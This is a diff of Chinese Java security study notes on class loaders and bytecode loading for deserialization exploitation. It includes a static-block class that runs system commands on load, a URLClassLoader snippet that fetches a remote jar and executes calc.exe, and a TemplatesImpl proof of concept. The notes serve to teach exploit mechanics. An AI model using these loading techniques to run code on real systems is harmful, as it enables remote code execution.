@@ -90,22 +90,81 @@
 
   ![image-20211202190429300](java代码审计.assets/image-20211202190429300.png)
 - **AppClassLoader是默认的类加载器**，如果类加载时我们不指定类加载器的情况下，默认会使用AppClassLoader 加载类。 ClassLoader.getSystemClassLoader() 返回的系统类加载器也是AppClassLoader。
-- 值得注意的是某些时候我们获取一个类的类加载器的时候可能会返回一个null值。如：java.io.File.class.getClassLoader() 将返回一个 null 对象，因为 java.io.File 类在JVM初始化的时候会被 Bootstrap ClassLoader加载，我们在尝试获取被BootStrap ClassLoader类加载器所加载的类的ClassLoader的时候都会返回null。
+- 值得注意的是某些时候我们获取一个类的类加载器的时候可能会返回一个null值。如：java.io.File.class.getClassLoader() 将返回一个 null 对象，因为 java.io.File 类在JVM初始化的时候会被 Bootstrap ClassLoader加载**，我们在尝试获取被BootStrap ClassLoader类加载器所加载的类的ClassLoader的时候都会返回null。**
 - java类动态加载方式
 
   - Java类加载方式分为 **显式** 和 **隐式**。显式即我们通常使用**类Class中的ForName()**或者 **ClassLoader** 来动态加载一个类，而隐式指的是类名.方法名() 或 new 类实例。显式类加载方式也可以理解为类动态加载，我们可以自定义类加载器去加载任意的类，**类动态加载要配合反射机制一起用**。
   - 常用的类显示加载方式：
 
-    - Class中的ForName()
+    - **Class中的ForName()**
+      
       ```java
       Class<?> clazz = Class.forName("com.xxx.xxx.Test");
       Class<?> clazz = Class.forName("类名"，是否初始化类，类加载器)；
       ```
-    - Classloader加载
+    - **Classloader加载**
+      
       ```java
       Class<?> clazz = this.getClass().getClassLoader().loadClass("com.xxx.xxx.Test");
       ```
-    - **class.forName("类名") 默认会初始化被加载类的静态属性和类方法**，如果不希望初始化类可以使用 `Class.forName("类名"，是否初始化类，类加载器)`，而ClassLoader.loadClass 默认不会初始化类方法。
+
+- **class.forName("类名") 默认会初始化被加载类的静态属性和类方法**，如果不希望初始化类可以使用 `Class.forName("类名"，是否初始化类，类加载器)`，而`ClassLoader.loadClass` 默认不会初始化类方法。
+
+    - 都不会执行构造函数，那执行的是什么
+
+    - ```java
+        package cc;
+        
+        public class TrainPrint {
+            {
+                System.out.printf("Empty block initial %s\n", this.getClass());
+            }
+            static {
+                System.out.printf("Static initial %s\n", TrainPrint.class);
+            }
+            public TrainPrint() {
+                System.out.printf("Initial %s\n", this.getClass());
+            }
+        
+            public static void main(String[] args) {
+        
+            }
+        }
+        
+        ```
+
+    - 其中， **static {} 就是在“类初始化”的时候调⽤的**，⽽ {} 中的代码会放在构造函数的 super() 后⾯， 但在当前构造函数内容的前⾯。 所以说， forName 中的 initialize=true 其实就是告诉Java虚拟机是否执⾏”类初始化“。
+
+    - 那么，假设我们有如下函数，其中函数的参数name可控：
+
+        - ```java
+            public void ref(String name) throws Exception {
+             Class.forName(name);
+            }
+            ```
+
+        - 那么我们就直接构造一个恶意类，恶意代码卸载static{}中，然后这个类一forname初始化，就执行了恶意代码
+
+            - ```java
+                import java.lang.Runtime;
+                import java.lang.Process;
+                public class TouchFile {
+                     static {
+                         try {
+                             Runtime rt = Runtime.getRuntime();
+                             String[] commands = {"touch", "/tmp/success"};
+                             Process pc = rt.exec(commands);
+                        	 pc.waitFor();
+                         } catch (Exception e) {
+                         	// do nothing
+                         }
+                     }
+                }
+                ```
+
+            - 当然，这个恶意类如何带⼊目标机器中，可能就涉及到ClassLoader的⼀些利⽤⽅法了，本⽂暂不做讨论
+
+- **使⽤功能”.class”来创建Class对象的引⽤时，不会⾃动初始化该Class对 象，使⽤forName()会⾃动初始化该Class对象。**
 
 ### ClassLoader类加载流程
 
@@ -118,82 +177,161 @@
   6. 如果调用loadClass的时候传入的resolve参数为true，那么还需要调用resolveClass方法链接类,默认为false。
   7. **返回一个被JVM加载后的java.lang.Class类对象。**
 - 综合上述步骤可知ClassLoader类有如下核心方法：
-  - loadClass：加载指定的Java类
-  - findClass：查找指定的Java类
-  - findLoaderClass：查找JVM已经加载过的类
-  - defindClass：定义一个Java类,也可以理解为把这个类的字节码交给jvm，这样jvm就可以用了。
-  - resolveClass：链接指定的Java类
+  - **loadClass：加载指定的Java类**
+  - **findClass：查找指定的Java类**
+  - **findLoaderClass：查找JVM已经加载过的类**
+  - **defindClass：定义一个Java类,也可以理解为把这个类的字节码交给jvm，这样jvm就可以用了。**
+  - **resolveClass：链接指定的Java类**。真正核心的部分其实是 defineClass ，他决定了如何将一段字节流转变成一个Java类，Java 默认的 ClassLoader#defineClass 是一个native方法，逻辑在JVM的C语言代码中。
 
-### 自定义ClassLoader
+### 自定义ClassLoader加载器
 
 - **java.lang.ClassLoader是所有的类加载器的父类**，java.lang.ClassLoader有非常多的子类加载器，比如我们用于加载jar包的java.net.URLClassLoader其本身通过继承java.lang.ClassLoader类，重写了findClass方法从而实现了加载目录class文件甚至是远程资源文件。
+
 - **我们只要继承了java.lang.ClassLoader类，然后重写findclass方法就可以自定义一个类加载器了。**
+
 - 利用自定义类加载器我们可以在webshell中实现加载并调用自己编译的类对象，比如本地命令执行漏洞调用自定义类字节码的native方法绕过RASP检测（Runtime application self-protection），也可以用于加密重要的Java类字节码(只能算弱加密了)。
+
 - 自定义ClassLoader（**看完反射机制再来看代码**）
 
-  - 使用自定义类加载器重写findClass方法，然后在调用defineClass方法的时候传入TestHelloWorld类的字节码的方式来向JVM中定义一个TestHelloWorld类，最后通过反射机制就可以调用TestHelloWorld类的hello方法了。
-  - com.anbai.sec.classloader.TestHelloWorld文件的源码：
-
-    ```java
-    package com.anbai.sec.classloader;
-    /**
-      * Creator: yz
-      * Date: 2019/12/17
-      */
-    public class TestHelloWorld{
-            public String hello(){
-            return "Hello World~";
+    - ```java
+        package cc;
+        
+        import java.lang.reflect.Method;
+        public class TestClassLoader extends ClassLoader {
+            // TestHelloWorld类名
+            private static String testClassName = "com.anbai.sec.classloader.TestHelloWorld";
+            // TestHelloWorld类字节码
+            private static byte[] testClassBytes = new byte[]{
+                    -54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0,
+                    16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100,
+                    101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101,
+                    1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108,
+                    97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99,
+                    101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111,
+                    114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111,
+                    32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47,
+                    115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115,
+                    116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108,
+                    97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1,
+                    0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0,
+                    1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1,
+                    0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11,
+                    0, 0, 0, 2, 0, 12
+            };
+            @Override
+            public Class<?> findClass(String name) throws ClassNotFoundException {
+                // 只处理TestHelloWorld类
+                if (name.equals(testClassName)) {
+                    // 调用JVM的native方法定义TestHelloWorld类
+                    return defineClass(testClassName, testClassBytes, 0, testClassBytes.length);
+                }
+                return super.findClass(name);
             }
-    }
-    ```
+            public static void main(String[] args) {
+                // 创建自定义的类加载器
+                TestClassLoader loader = new TestClassLoader();
+                try {
+                    // 使用自定义的类加载器加载TestHelloWorld类
+                    Class testClass = loader.loadClass(testClassName);
+                    // 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();
+                    Object testInstance = testClass.newInstance();
+                    // 反射获取hello方法
+                    Method method = testInstance.getClass().getMethod("hello");
+                    // 反射调用hello方法,等价于 String str = t.hello();
+                    String str = (String) method.invoke(testInstance);
+                    System.out.println(str);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+        }
+        ```
+
+- 
+
+## 动态加载字节码
+
+我们上面已经介绍了类加载器是怎么加载class文件的。我们现在想自己加载字节码。在后面的反序列漏洞，fastjson都会利用到。
+
+### URLClassLoader
+
+- URLClassLoader继承了ClassLoader，URLClassLoader提供了加载远程资源的能力，在写漏洞利用的payload或者webshell的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用。
+
+- 正常情况下，Java会根据配置项 `sun.boot.class.path` 和 `java.class.path` 中列举到的基础路径（这 些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：
+
+    - URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 `JarLoader` 来寻找类，即为在Jar包中寻 找.class文件 
+    - URL以斜杠 / 结尾，且协议名是 file ，则使用 `FileLoader` 来寻找类，即为在本地文件系统中寻 找.class文件
+    - URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 `Loader` 来寻找类 
+
+- 我们正常开发的时候通常遇到的是前两者，那什么时候才会出现使用 Loader 寻找类的情况呢？当然是 非 file 协议的情况下，最常见的就是 http 协议。
+
+    > 这里其实会涉及到一个问题：“Java的URL究竟支持哪些协议”，但这并不是本文的重点，以后我们 肯定会在SSRF相关的章节中说到，所以这里就不深入研究了。
+
+- 我们可以使用HTTP协议来测试一下，看Java是否能从远程HTTP服务器上加载.class文件：
+
+    - ```java
+        import java.net.URL;
+        import java.net.URLClassLoader;
+        public class HelloClassLoader
+        {
+            public static void main( String[] args ) throws Exception
+            {
+                URL[] urls = {new URL("http://localhost:8000/")};
+                URLClassLoader loader = URLClassLoader.newInstance(urls);
+                Class c = loader.loadClass("Hello");
+                c.newInstance();
+            }
+        }
+        ```
+
+    - 我们编译一个简单的HelloWorld程序，放在 http://localhost:8080/Helloworld.class ：
+
+        - ```java
+            public class HelloWorld {
+                public HelloWorld(){
+                    System.out.println("Hello,World");
+                }
+            }
+            ```
+
+    - 成功请求到我们的 /Helloworld.class 文件，并执行了文件里的字节码，输出了"Hello World"。 所以，作为攻击者，如果我们能够控制目标Java ClassLoader的基础路径为一个http服务器，则可以利 用远程加载的方式执行任意代码了。
+
+- jar中加载class示例
 
     ```java
     package test;
-    
-    import java.lang.reflect.Method;
-    public class TestClassLoader extends ClassLoader {
-        // TestHelloWorld类名
-        private static String testClassName = "com.anbai.sec.classloader.TestHelloWorld";
-        // TestHelloWorld类字节码
-        private static byte[] testClassBytes = new byte[]{
-                -54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0,
-                16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100,
-                101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101,
-                1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108,
-                97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99,
-                101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111,
-                114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111,
-                32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47,
-                115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115,
-                116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108,
-                97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1,
-                0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0,
-                1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1,
-                0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11,
-                0, 0, 0, 2, 0, 12
-        };
-        @Override
-        public Class<?> findClass(String name) throws ClassNotFoundException {
-            // 只处理TestHelloWorld类
-            if (name.equals(testClassName)) {
-                // 调用JVM的native方法定义TestHelloWorld类
-                return defineClass(testClassName, testClassBytes, 0, testClassBytes.length);
-            }
-            return super.findClass(name);
-        }
+    import java.io.ByteArrayOutputStream;
+    import java.io.InputStream;
+    import java.net.URL;
+    import java.net.URLClassLoader;
+    /**
+        * Creator: yz
+        * Date: 2019/12/18
+        */
+    public class TestURLClassLoader {
         public static void main(String[] args) {
-            // 创建自定义的类加载器
-            TestClassLoader loader = new TestClassLoader();
             try {
-                // 使用自定义的类加载器加载TestHelloWorld类
-                Class testClass = loader.loadClass(testClassName);
-                // 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();
-                Object testInstance = testClass.newInstance();
-                // 反射获取hello方法
-                Method method = testInstance.getClass().getMethod("hello");
-                // 反射调用hello方法,等价于 String str = t.hello();
-                String str = (String) method.invoke(testInstance);
-                System.out.println(str);
+                // 定义远程加载的jar路径
+                URL url = new URL("https://javaweb.org/tools/cmd.jar");
+                // 创建URLClassLoader对象，并加载远程jar包
+                URLClassLoader ucl = new URLClassLoader(new URL[]{url});
+                // 定义需要执行的系统命令
+                String cmd = "calc.exe";
+                // 通过URLClassLoader加载远程jar包中的CMD类
+                Class cmdClass = ucl.loadClass("CMD");
+                // 调用CMD类中的exec方法，等价于: Process process = CMD.exec("calc.exe");
+                Process process = (Process) cmdClass.getMethod("exec", String.class).invoke(null, cmd);
+                // 获取命令执行结果的输入流
+                InputStream           in   = process.getInputStream();
+                ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                byte[]                b    = new byte[1024];
+                int                   a    = -1;
+                // 读取命令执行结果
+                while ((a = in.read(b)) != -1) {
+                    baos.write(b, 0, a);
+                }
+                // 输出命令执行结果
+                System.out.println(baos.toString());
             } catch (Exception e) {
                 e.printStackTrace();
             }
@@ -201,68 +339,346 @@
     }
     ```
 
-### URLClassLoader
+    - 执行结果，弹出计算器。
 
-- URLClassLoader继承了ClassLoader，URLClassLoader提供了加载远程资源的能力，在写漏洞利用的payload或者webshell的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用。
-- TestURLClassLoader.java示例：
+    - 远程的cmd.jar中就一个CMD.class文件，对应的编译之前的代码片段如下：
 
-  ```java
-  package test;
-  import java.io.ByteArrayOutputStream;
-  import java.io.InputStream;
-  import java.net.URL;
-  import java.net.URLClassLoader;
-  /**
-      * Creator: yz
-      * Date: 2019/12/18
-      */
-  public class TestURLClassLoader {
-      public static void main(String[] args) {
-          try {
-              // 定义远程加载的jar路径
-              URL url = new URL("https://javaweb.org/tools/cmd.jar");
-              // 创建URLClassLoader对象，并加载远程jar包
-              URLClassLoader ucl = new URLClassLoader(new URL[]{url});
-              // 定义需要执行的系统命令
-              String cmd = "calc.exe";
-              // 通过URLClassLoader加载远程jar包中的CMD类
-              Class cmdClass = ucl.loadClass("CMD");
-              // 调用CMD类中的exec方法，等价于: Process process = CMD.exec("calc.exe");
-              Process process = (Process) cmdClass.getMethod("exec", String.class).invoke(null, cmd);
-              // 获取命令执行结果的输入流
-              InputStream           in   = process.getInputStream();
-              ByteArrayOutputStream baos = new ByteArrayOutputStream();
-              byte[]                b    = new byte[1024];
-              int                   a    = -1;
-              // 读取命令执行结果
-              while ((a = in.read(b)) != -1) {
-                  baos.write(b, 0, a);
+        - ```java
+            import java.io.IOException;
+            /**
+            * Creator: yz
+            * Date: 2019/12/18
+            */
+            public class CMD {
+            	public static Process exec(String cmd) throws IOException {
+            		return Runtime.getRuntime().exec(cmd);
+            	}
+            }
+            
+            ```
+
+
+
+
+### 利用ClassLoader#defineClass直接加载字节码
+
+- 我们上面学了怎么自定义ClassLoader。真正核心的部分其实是 defineClass ，他决定了如何将一段字节流转变成一个Java类，Java 默认的 ClassLoader#defineClass 是一个native方法，逻辑在JVM的C语言代码中。
+-  我们可以编写一个简单的代码，来演示如何让系统的 defineClass 来直接加载字节码：
+
+    - ```java
+        import java.lang.reflect.Method;
+        import java.util.Base64;
+        
+        public class HelloDefineClass {
+            public static void main(String[] args) throws Exception {
+                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
+                defineClass.setAccessible(true);
+                byte[] code = Base64.getDecoder().decode("yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM");
+                Class hello = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), "Hello", code, 0, code.length);
+                hello.newInstance();
+            }
+        ```
+    - 注意一点，在 defineClass 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造 函数，初始化代码才能被执行。而且，即使我们将初始化代码放在类的static块中（在本系列文章第一篇 中进行过说明），在 defineClass 时也无法被直接调用到。**所以，如果我们要使用 defineClass 在目标机器上执行任意代码，需要想办法调用构造函数。**
+
+- 执行上述example，输出了Hello World：
+- 这里，因为系统的 `ClassLoader#defineClass` 是一个保护属性，所以我们无法直接在外部访问，不得 不使用反射的形式来调用。 在实际场景中，因为defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我 们常用的一个攻击链 TemplatesImpl 的基石。
+
+### 利用TemplatesImpl加载字节码
+
+- 虽然大部分上层开发者不会直接使用到defineClass方法，但是Java底层还是有一些类用到了它（否则他也没存在的价值了对吧），这就是 `TemplatesImpl`(模板实现类) 。 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 这个类中定义了一个内部类 `TransletClassLoader` ：
+
+    - ```java
+            static final class TransletClassLoader extends ClassLoader {
+                private final Map<String,Class> _loadedExternalExtensionFunctions;
+        
+                 TransletClassLoader(ClassLoader parent) {
+                     super(parent);
+                    _loadedExternalExtensionFunctions = null;
+                }
+        
+                TransletClassLoader(ClassLoader parent,Map<String, Class> mapEF) {
+                    super(parent);
+                    _loadedExternalExtensionFunctions = mapEF;
+                }
+        
+                public Class<?> loadClass(String name) throws ClassNotFoundException {
+                    Class<?> ret = null;
+                    // The _loadedExternalExtensionFunctions will be empty when the
+                    // SecurityManager is not set and the FSP is turned off
+                    if (_loadedExternalExtensionFunctions != null) {
+                        ret = _loadedExternalExtensionFunctions.get(name);
+                    }
+                    if (ret == null) {
+                        ret = super.loadClass(name);
+                    }
+                    return ret;
+                 }
+        
+                /**
+                 * Access to final protected superclass member from outer class.
+                 */
+                Class defineClass(final byte[] b) {
+                    return defineClass(null, b, 0, b.length);
+                }
+            }
+        
+        ```
+
+- 这个类里重写了 defineClass 方法，并且这里没有显式地声明其定义域。Java中默认情况下，如果一个 方法没有显式声明作用域，其作用域为default。**所以也就是说这里的 defineClass 由其父类的 protected类型变成了一个default类型的方法，可以被类外部调用。**
+
+- 我们从 TransletClassLoader#defineClass() 向前追溯一下调用链：
+
+    - ```java
+        TemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() ->
+        TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses()
+        -> TransletClassLoader#defineClass()
+        ```
+
+    - 显示调用了字节码的类的构造函数的代码在`getTransletInstance()`函数里面
+
+        - ```java
+            // The translet needs to keep a reference to all its auxiliary
+            // class to prevent the GC from collecting them
+            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
+            ```
+
+- 追到最前面两个方法 `TemplatesImpl#getOutputProperties()` 、 `TemplatesImpl#newTransformer()` ，这两者的作用域是public，可以被外部调用。我们尝试用 newTransformer() 构造一个简单的POC：
+
+    - ```java
+        package cc;
+        
+        import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+        import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+        
+        import java.lang.reflect.Field;
+        import java.util.Base64;
+        
+        public class HelloDefineClass {
+            public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+                Field field = obj.getClass().getDeclaredField(fieldName);
+                field.setAccessible(true);
+                field.set(obj, value);
+            }
+            public static void main(String[] args) throws Exception {
+        
+                byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAKAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAADAALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA4ABAAPAAwAEAABABAAAAACABE=");
+                TemplatesImpl obj = new TemplatesImpl();
+                setFieldValue(obj, "_bytecodes", new byte[][] {code});
+                setFieldValue(obj, "_name", "HelloTemplatesImpl");
+                setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
+                obj.newTransformer();
+        
+            }
+        }
+        
+        ```
+
+    - 
+
+- 其中， `setFieldValue` 方法用来设置私有属性，可见，这里我设置了三个属性： _bytecodes 、 _name 和 _tfactory 。
+
+    -  `_bytecodes 是由字节码组成的数组；`，也就是最后传入defneClass的字节码
+    -  _name 可以是任意字符串，只要不为null即可； 
+    - _tfactory 需要是一个 TransformerFactoryImpl 对象，因为 `TemplatesImpl#defineTransletClasses()` 方法里有调用到 `_tfactory.getExternalExtensionsMap()` ，如果是null会出错。 
+    - 另外，值得注意的是， TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须 是 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet` 的子类。
+
+- 所以，我们需要构造一个特殊的类：
+
+    - ```java
+        import com.sun.org.apache.xalan.internal.xsltc.DOM;
+        import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+        import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+        import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+        import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+        
+        public class HelloTemplatesImpl extends AbstractTranslet {
+        
+            public void transform(DOM document, SerializationHandler[] handlers)
+            throws TransletException {}
+                public void transform(DOM document, DTMAxisIterator iterator,
+                SerializationHandler handler) throws TransletException {}
+                public HelloTemplatesImpl() {
+                    super();
+                    System.out.println("Hello TemplatesImpl");
+                    }
+                }
+        }
+        ```
+
+        - base64编码这个文件
+
+            - ```java
+                import java.util.Base64;
+                
+                public class BaseDemo {
+                    public static void main(String[] args) throws IOException {
+                        InputStream fileInputStream = new FileInputStream(new File("D:\\code\\java code\\java_sec\\se_sec\\HelloTemplatesImpl.class"));
+                            BufferedInputStream buf = new BufferedInputStream(fileInputStream);
+                            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+                            int len;
+                            byte [] bytes = new byte[1024];
+                            while ((len=buf.read(bytes))!=-1){
+                                byteArrayOutputStream.write(bytes,0,len);
+                            }
+                            System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));
+                    }
+                }
+                ```
+
+    - 它继承了 `AbstractTranslet` 类，并在构造函数里插入Hello的输出。将其编译成字节码，即可被 `TemplatesImpl` 执行了：
+
+        - ```cmd
+            
+            Hello TemplatesImpl
+            
+            Exception in thread "main" java.lang.NullPointerException
+            	at com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.postInitialization(AbstractTranslet.java:372)
+            	at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:456)
+            	at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:486)
+            	at cc.HelloDefineClass.main(HelloDefineClass.java:22)
+            
+            进程已结束,退出代码1
+            ```
+
+- **在多个Java反序列化利用链，以及fastjson、jackson的漏洞中，都曾出现过 TemplatesImpl 的身影，这 个系列后文中仍然会再次见到它的身影。**
+
+- 总结：需要调用`TemplatesImpl`的`newTransformer()`函数
+
+### 利用BCEL ClassLoader加载字节码
+
+> https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html
+
+#### BCEL从哪里来
+
+- 首先，BCEL究竟是什么？它为什么会出现在JDK中？
+- BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目。Apache Commons大家应该不陌生，反序列化最著名的利用链就是出自于其另一个子项目——Apache Commons Collections。
+- BCEL库提供了一系列用于分析、创建、修改Java Class文件的API。
+- 就这个库的功能来看，其使用面远不及同胞兄弟们，但是他比Commons Collections特殊的一点是，**它被包含在了原生的JDK中，位于`com.sun.org.apache.bcel`。**
+- JDK会将BCEL放到自己的代码中，主要原因是为了支撑Java XML相关的功能。准确的来说，Java XML功能包含了JAXP规范，而Java中自带的JAXP实现使用了Apache Xerces和Apache Xalan，Apache Xalan又依赖了BCEL，所以BCEL也被放入了标准库中。
+- JAXP全名是[Java API for XML Processing](https://zh.wikipedia.org/wiki/JAXP)，他是Java定义的一系列接口，用于处理XML相关的逻辑，包括DOM、SAX、StAX、XSLT等。Apache Xalan实现了其中XSLT相关的部分，其中包括xsltc compiler。
+- XSLT（扩展样式表转换语言）是一种为可扩展置标语言提供表达形式而设计的计算机语言，主要用于将XML转换成其他格式的数据。既然是一门动态“语言”，在Java中必然会先被编译成Java，才能够执行。
+- XSLTC Compiler就是一个命令行编译器，可以将一个xsl文件编译成一个class文件或jar文件，编译后的class被称为translet，可以在后续用于对XML文件的转换。其实就将XSLT的功能转化成了Java代码，优化执行的速度，如果我们不使用这个命令行编译器进行编译，Java内部也会在运行过程中存在编译的过程。
+- 我们尝试用本地的Java（注意需要用Java7或6，使用8将会出现异常）来编译一下hello.xsl：
+    - 可见，从`hello.xsl`生成了`hello.class`，反编译这个class即可看到源代码。
+    - 我们看反编译过来的源码，这个代码里的`AbstractTranslet`会不会有点眼熟？我们在反序列化时常用的另一个类`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`，它在`defineClass`中需要的字节码所对应的基类，就是这里的`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`。
